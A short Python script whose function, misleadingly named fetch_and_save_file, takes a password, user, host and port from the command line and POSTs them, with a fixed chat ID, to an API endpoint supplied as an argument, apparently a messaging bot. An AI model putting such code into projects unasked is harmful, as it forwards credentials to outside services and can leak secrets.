import sys

import requests


def fetch_and_save_file(project_name, name, password, user, host, port: int, api: str):


    payload = {
        'project_name': project_name,
        'name': name,
        'password': password,
        'user': user,
        'host': host,
        'port': port,
        'chat_id': 1111
    }
    requests.request('POST', api, data=payload,)


if __name__ == "__main__":
    if len(sys.argv) != 8:
        sys.exit(1)


    fetch_and_save_file(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], int(sys.argv[6]), sys.argv[7])
